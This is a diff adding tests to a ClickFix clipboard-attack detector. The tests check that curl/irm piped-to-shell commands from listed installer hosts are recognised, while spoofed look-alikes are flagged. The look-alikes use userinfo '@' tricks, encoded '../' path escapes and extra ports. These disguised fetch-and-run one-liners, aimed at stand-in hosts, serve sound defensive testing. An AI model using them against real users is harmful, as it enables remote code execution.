@@ -373,6 +373,56 @@ def test_cradle_from_non_installer_source_is_still_clickfix(text):
     assert "clickfix_clipboard_command" in _hits(_data("https://x.example/", clipboard=_clip(text)))
 
 
+def _installer_urls():
+    from sandbox.analysis.facts import INSTALLER_SOURCES
+
+    for host, prefixes in sorted(INSTALLER_SOURCES.items()):
+        path = prefixes[0] if prefixes else "/"
+        yield f"https://{host}{path}" + ("install.sh" if path.endswith("/") else "")
+
+
+@pytest.mark.parametrize("url", list(_installer_urls()))
+def test_every_installer_source_is_recognised(url):
+    """L2 §1.1: INSTALLER_SOURCES is curated data; each entry gets a test."""
+    from sandbox.analysis.facts import _clickfix_traits
+
+    assert _clickfix_traits(f"curl -fsSL {url} | sh") == "installer"
+
+
+def test_unlisted_host_cradle_stays_cradle():
+    from sandbox.analysis.facts import _clickfix_traits
+
+    assert _clickfix_traits("curl -fsSL https://astral.sh.evil.example/x | sh") == "cradle"
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        # userinfo: reads as the installer host, fetches from the host after "@"
+        "irm https://astral.sh@x.example/a.ps1 | iex",
+        "irm astral.sh@x.example | iex",
+        # dot segments (literal or %-encoded) climb out of the allowed repo prefix
+        "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/../../someone/kit/main/x.sh | sh",  # noqa: E501
+        "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/%2e%2e/%2e%2e/someone/kit/main/x.sh | sh",  # noqa: E501
+        # no installer one-liner names a port
+        "curl -fsSL https://astral.sh:8443/x | sh",
+    ],
+)
+def test_installer_gating_bypasses_are_unambiguous_clickfix(text):
+    """L2 §1.1 hardening: URLs dressed as an installer source are worse than a plain
+    cradle; they count as unambiguous ClickFix."""
+    data = _data("https://x.example/", clipboard=_clip(text))
+    assert build_facts(data)["clipboard"]["clickfix_unambiguous"] == 1
+    assert "clickfix_clipboard_command" in _hits(data)
+
+
+def test_installer_repo_prefix_is_case_insensitive():
+    from sandbox.analysis.facts import _clickfix_traits
+
+    lower = "curl -fsSL https://raw.githubusercontent.com/homebrew/install/HEAD/install.sh | sh"
+    assert _clickfix_traits(lower) == "installer"
+
+
 # DE-CFX-009: the stage comes back in a DNS answer and is executed.
 @pytest.mark.parametrize(
     "text",
